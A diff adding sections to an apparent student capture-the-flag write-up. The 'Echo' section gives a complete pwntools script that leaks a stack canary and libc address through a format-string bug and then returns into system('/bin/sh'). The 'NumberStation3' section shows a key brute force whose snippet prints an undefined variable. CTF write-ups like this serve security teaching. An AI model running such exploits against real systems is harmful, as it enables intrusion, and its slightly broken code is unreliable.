@@ -92,6 +92,113 @@ p.interactive()
 
 Running this, we were able to prompt a shell and cat the flag.
 
+## Echo
+
+For this challenged, we were once again given a binary executable.
+This is a simple program that repeatedly asks for input.
+Upon analyzing it further, we discovered a string format vulnerability that we could exploit.
+This gave us a way to analyze the stack (`%x`).
+
+However, by taking a look at the security measures in place, we got to the conclusion that doing a regular buffer overflow attack would not work, as the stack has DEP protection.
+Because of this, we thought it made sense to try and use ROP to exploit the program.
+
+```shell
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : FULL
+```
+
+The idea was to get a shell by making the program run `system` with the shell argument. For this to work, we would need the following things:
+
+- The `libc` base address.
+- `system` and `/bin/sh` addresses in the libc.
+- Find a way around the canary protection.
+
+### Libc base address
+
+In order to use libc functions, we need its base address.
+Because the address space is randomize, this task becomes a bit harder.
+However, the program allows for us to send multiple inputs and we can take advantage of that to retrieve information.
+
+Even though the address space is randomized, we expect for the ESP to stay in a relative position to other elements of the stack, namely the libc base address.
+This way, to get the actual libc address, we calculated the offset for an execution of the program and used that value to get to the actual address.
+
+### System and shell offsets
+
+To get the system function address we did the following:
+
+```bash
+$ objdump -T libc.so.6 | grep "system"
+00163690 g    DF .text	0000006a (GLIBC_2.0)  svcerr_systemerr
+00048150  w   DF .text	0000003f  GLIBC_2.0   system
+00048150 g    DF .text	0000003f  GLIBC_PRIVATE __libc_system
+```
+
+Then, to get the `/bin/sh` on libc:
+
+```bash
+$ strings -a -t x libc.so.6 | grep "/bin/sh"
+ 1bd0f5 /bin/sh
+```
+
+Thus, we now know that the offsets for system and the shell are `0x48150` and `0x1bd0f5`, respectively.
+
+### Canary
+
+Because of `checksec`, we know that the program's stack is protected by a canary.
+Because of the stack analysis done before, we know that the canary will occupy the position 8 on the stack. 
+So all we need to do is leak it with the format vulnerability and include it in the payload.
+
+### Exploit
+
+After all these values were calculated, we created the following exploit to get the flag:
+
+```py
+#!/usr/bin/python3
+from pwn import *
+  
+p = remote("ctf-fsi.fe.up.pt", 4002)
+
+libc_offset = 136473
+
+system_offset = 0x00048150
+shell_offset = 0x1bd0f5
+
+def send(p, msg):
+	p.recvuntil(b">")
+	p.sendline(b"e")
+	p.recvuntil(b"chars): ")
+	p.sendline(msg)
+	line = p.recvline()
+	p.recvuntil(b"message: ")
+	p.sendline(b"")
+	return line
+	
+values = send(p, b"%8$x %11$x") 
+
+canary, ref = [int(x, 16) for x in values.split()]
+
+libc = ref - libc_offset   #get base libc
+system = libc + system_offset
+shell = libc + shell_offset
+
+content = bytearray(0x90 for i in range(80))
+content[20:24]  =  (canary + 1).to_bytes(4, byteorder='little')
+content[32:36]  =  (system).to_bytes(4, byteorder='little')
+content[40:44]  =  (shell).to_bytes(4, byteorder='little')
+
+send(p, content)
+
+content = bytearray(0x90 for i in range(19))
+send(p, content)
+
+p.interactive()
+```
+
+
 ## Aply for Flag II
 
 The description of the challenged mentioned the websites were separated. However, the XSS vulnerability was still there.
@@ -129,3 +236,26 @@ document.querySelector('#abc').click()
 
 After disabling js in the browser (to avoid running the script ourselves), we were able to get the flag.
 
+## NumberStation3
+
+After analyzing the code given, we concluded that the encryption relied on a random string of size 16 bytes:
+
+```python
+rkey = bytearray(os.urandom(16))
+```
+
+Thus, it could be an option to brute force this string to try and find the flag.
+So, that's what we did:
+
+```py
+for i in range(2 ** 16):    
+    b = "{0:b}".format(i).zfill(16)
+    array = bytearray([int(x) for x in b])
+    
+    dec_flag = dec(array, unhexlify(flag))
+    if b'flag' in dec_flag:
+        print(m)
+        break
+```
+
+Doing so, we were able to decrypt the message and get the flag.
